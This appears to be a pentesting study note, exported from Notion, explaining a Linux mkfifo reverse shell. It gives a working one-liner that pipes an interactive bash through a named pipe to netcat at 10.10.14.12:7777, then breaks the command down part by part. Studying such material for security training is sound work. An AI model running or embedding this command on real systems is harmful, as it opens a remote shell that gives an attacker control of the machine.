# mkfifo reverse shell

OS: Linux
Description: mkfifo reverse shell
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### Interesting Bash Reverse Shell

```jsx
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

### Breakdown:

### **Remove /tmp/f**

```
rm -f /tmp/f;

```

Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.

### **Make A Named Pipe**

```
mkfifo /tmp/f;

```

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

### **Output Redirection**

```
cat /tmp/f |

```

Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).

### **Set Shell Options**

```
/bin/bash -i 2>&1 |

```

Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).

### **Open a Connection with Netcat**

```
nc 10.10.14.12 7777 > /tmp/f
```